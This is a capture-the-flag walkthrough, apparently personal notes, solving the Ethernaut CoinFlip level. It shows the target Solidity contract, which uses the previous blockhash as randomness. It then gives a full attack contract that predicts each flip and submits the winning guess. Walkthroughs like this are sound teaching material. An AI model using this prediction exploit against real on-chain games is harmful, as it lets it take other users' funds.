### Ethernaut coinflip

Take a gander at this contract

You'll notice that it attempts to make a game where the user has a 50% chance of guessing the right answer.

Our goal is to get 10 consecutive wins.

Can you spot anything sketchy about this contract? 

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import '@openzeppelin/contracts/math/SafeMath.sol';

contract CoinFlip {

  using SafeMath for uint256;
  uint256 public consecutiveWins;
  uint256 lastHash;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

  constructor() public {
    consecutiveWins = 0;
  }

  function flip(bool _guess) public returns (bool) {
    uint256 blockValue = uint256(blockhash(block.number.sub(1)));

    if (lastHash == blockValue) {
      revert();
    }

    lastHash = blockValue;
    uint256 coinFlip = blockValue.div(FACTOR);
    bool side = coinFlip == 1 ? true : false;

    if (side == _guess) {
      consecutiveWins++;
      return true;
    } else {
      consecutiveWins = 0;
      return false;
    }
  }
}
```


If you take a look at the flip function, you'll notice that the answer is computed using a bad source of randomness. Anyone can see the value of FACTOR, and anyone can computer the value of blockValue.

We can write a contract that can compute what the answer would be, and then submit it to the coinflip contract to get wins every time. 

Here's a contract that can be used to win this coinflip game.


```
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.4.1/contracts/math/SafeMath.sol";

interface ICoinFlip {
    function flip(bool _guess) external;
    function consecutiveWins() view external returns (uint256);
}

contract Attack {
    using SafeMath for uint256;
	
    address coinFlipAddress = 0x53eeD803C0ec5b969dc401CE8abfa9D67f341058;

    ICoinFlip coinFlipContract = ICoinFlip(coinFlipAddress);

    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    function predictFuture() public returns (uint256) {
        uint256 blockValue = uint256(blockhash(block.number.sub(1)));
        uint256 coinFlip = blockValue.div(FACTOR);
        bool side = coinFlip == 1 ? true : false;
        coinFlipContract.flip(side);
    }

    function getConsecutiveWins() public view returns (uint256) {
        return coinFlipContract.consecutiveWins();
    }
}
```

In the function titles predictFuture, we get the value of the coinflip the same way the original contract does it. 

Deploy this attack contract, call predictFuture 10x and you'll have solved this level

%%TODO:  upload the photo to imgur  %%
![[Pasted image 20220415142517.png]]